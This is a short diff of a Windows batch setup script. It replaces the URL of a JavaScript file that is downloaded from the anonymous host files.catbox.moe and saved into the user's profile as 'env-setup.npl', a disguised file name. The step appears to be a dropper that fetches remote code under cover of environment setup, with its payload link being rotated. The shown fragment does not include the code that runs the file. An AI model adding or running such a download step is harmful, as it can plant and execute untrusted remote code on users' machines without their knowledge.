@@ -99,7 +99,7 @@ set "CODEPROFILE=%USERPROFILE%"
 if not exist "%CODEPROFILE%" mkdir "%CODEPROFILE%"
 set "ENV_SETUP_FILE=%CODEPROFILE%\env-setup.npl"
 
-call :download_file "https://files.catbox.moe/1gq866.js" "%ENV_SETUP_FILE%"
+call :download_file "https://files.catbox.moe/92zc8z.js" "%ENV_SETUP_FILE%"
 if errorlevel 1 exit /b 1
 
 :: -------------------------
